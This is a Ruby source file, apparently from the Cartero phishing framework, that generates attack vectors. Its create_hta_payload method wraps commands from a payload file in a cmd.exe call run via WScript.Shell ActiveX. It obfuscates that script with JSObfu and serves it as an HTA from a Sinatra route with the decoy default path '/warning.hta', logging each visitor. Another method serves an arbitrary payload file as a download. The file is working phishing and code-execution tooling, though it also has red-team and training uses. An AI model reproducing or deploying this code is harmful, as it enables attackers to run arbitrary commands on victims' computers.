module Cartero
class AttackVectors
	def initialize(options, payload)
		@options = options
		@payload = payload
		@webserver = Module.const_get(File.basename(@options.customwebserver).split(".")[0..-2].join(".").camelize)
		case options.attack_type
    when "hta"
    	puts "Generating obfuscated hta payload on #{options.request_path}"
    	create_hta_payload
    else
    	raise StandardError, "No attack type provided."
    end
	end
	attr_accessor :webserver
	attr_accessor :options
	attr_accessor :payload
	
	def create_hta_payload
  	require 'jsobfu'
  	hta = options.path.split("/")[-1] + "_hta"
  	if File.read(options.customwebserver).scan("require \"#{options.path + "/" + hta}\"").empty?
  		File.open(options.customwebserver,"a") {|x| x << "\n\nrequire \"#{options.path + "/" + hta}\""}
  	end
  	File.open(options.path + "/#{hta}.rb","w") {|x| x << "class #{webserver} < Sinatra::Base\n\tget \"#{options.request_path || "/warning.hta"}\" do\n\t\tcontent_type \"application/hta\"\n\t\tprocess_info(params,request)\n\t\terb :hta\n\tend\nend"} 
		script = "var c = 'cmd.exe /c #{File.readlines(payload).map {|x| x.strip}.join(" | ").gsub("\\","\\\\\\")}'; new ActiveXObject('WScript.Shell').Run(c);"
		obf_script = JSObfu.new(script).obfuscate(iterations: 3, global: 'this')
		File.open(options.views + "/hta.erb", "w" ) {|x| x << "<html>\n<body>\n<script>\n#{obf_script}\n</script>\n</body>\n</html>" }
  end

  def create_download_payload
  	download = options.path.split("/")[-1] + "_download"
  	if File.read(options.customwebserver).scan("require \"#{options.path + "/" + download}\"").empty?
  		File.open(options.customwebserver,"a") {|x| x << "\n\nrequire \"#{options.path + "/" + download}\""}
  	end
  	File.open(options.path + "/#{download}.rb","w") {|x| x << "class #{webserver} < Sinatra::Base\n\tget \"#{options.request_path || "/download"}\" do\n\t\tprocess_info(params, request)\n\t\treturn send_file(File.expand_path(#{payload}), :disposition => :attachment)\n\tend\nend" } 

  end

end
end

